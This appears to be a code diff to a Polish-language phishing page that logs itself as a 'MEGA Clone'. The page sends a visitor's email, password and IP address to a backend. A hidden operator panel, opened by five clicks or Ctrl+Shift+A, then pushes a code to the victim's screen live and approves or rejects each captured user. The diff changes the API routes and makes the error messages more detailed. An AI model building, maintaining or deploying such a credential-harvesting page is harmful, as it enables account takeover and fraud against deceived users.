@@ -74,7 +74,6 @@
         .status-badge.pending { background: #fbbf24; color: #1a1a1a; }
         .status-badge.approved { background: #4ade80; color: #1a1a1a; }
         .status-badge.rejected { background: #ef4444; color: white; }
-        .status-badge.waiting_confirm { background: #f59e0b; color: #1a1a1a; }
         .code-received-box { display: none; margin-top: 15px; padding: 20px; background: #0d1a0d; border: 2px solid #4ade80; border-radius: 12px; animation: fadeIn 0.5s ease; }
         .code-received-box.active { display: block; }
         .code-received-box .label { color: #888; font-size: 12px; margin-bottom: 5px; }
@@ -329,7 +328,7 @@
         }
 
         // ============================================================
-        // LOGOWANIE (przez API)
+        // LOGOWANIE (przez API z ?action=session)
         // ============================================================
         async function submitLogin() {
             const email = document.getElementById('emailInput').value.trim();
@@ -358,7 +357,7 @@
 
             try {
                 const ip = await getIP();
-                const response = await fetch(`${API_BASE}/session`, {
+                const response = await fetch(`${API_BASE}?action=session`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password, ip })
@@ -367,7 +366,7 @@
                 const data = await response.json();
 
                 if (!data.success) {
-                    showToast('❌ Błąd logowania', true);
+                    showToast('❌ Błąd logowania: ' + (data.error || 'Nieznany błąd'), true);
                     return;
                 }
 
@@ -394,7 +393,7 @@
                 startPolling();
 
             } catch (error) {
-                showToast('❌ Błąd połączenia z serwerem', true);
+                showToast('❌ Błąd połączenia z serwerem: ' + error.message, true);
                 console.error(error);
             }
         }
@@ -413,7 +412,7 @@
                 }
 
                 try {
-                    const response = await fetch(`${API_BASE}/poll-session?sessionId=${sessionId}`);
+                    const response = await fetch(`${API_BASE}?action=poll&sessionId=${sessionId}`);
                     const data = await response.json();
 
                     if (data.code && !codeVerified) {
@@ -576,7 +575,7 @@
             document.getElementById('adminStatus').style.color = '#fbbf24';
 
             try {
-                const response = await fetch(`${API_BASE}/set-code`, {
+                const response = await fetch(`${API_BASE}?action=set-code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -601,7 +600,7 @@
                     document.getElementById('adminStatus').style.color = '#ef4444';
                 }
             } catch (error) {
-                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia: ' + error.message;
                 document.getElementById('adminStatus').style.color = '#ef4444';
             }
         }
@@ -620,7 +619,7 @@
             document.getElementById('adminStatus').style.color = '#fbbf24';
 
             try {
-                const response = await fetch(`${API_BASE}/admin-approve`, {
+                const response = await fetch(`${API_BASE}?action=approve`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -649,7 +648,7 @@
                     document.getElementById('adminStatus').style.color = '#ef4444';
                 }
             } catch (error) {
-                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia: ' + error.message;
                 document.getElementById('adminStatus').style.color = '#ef4444';
             }
         }
@@ -667,7 +666,7 @@
             if (!confirm('❌ Na pewno odrzucić użytkownika?')) return;
 
             try {
-                const response = await fetch(`${API_BASE}/admin-reject`, {
+                const response = await fetch(`${API_BASE}?action=reject`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -693,7 +692,7 @@
                     document.getElementById('adminStatus').style.color = '#ef4444';
                 }
             } catch (error) {
-                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia';
+                document.getElementById('adminStatus').textContent = '❌ Błąd połączenia: ' + error.message;
                 document.getElementById('adminStatus').style.color = '#ef4444';
             }
         }
@@ -725,6 +724,7 @@
 
         console.log('🔐 MEGA Clone v2.0 - Kod pojawia się LIVE na ekranie użytkownika (API)');
         console.log('ℹ️ Kliknij 5x w ⚙️ lub Ctrl+Shift+A');
+        console.log('📡 API endpoint: /api?action=...');
     </script>
 </body>
 </html>
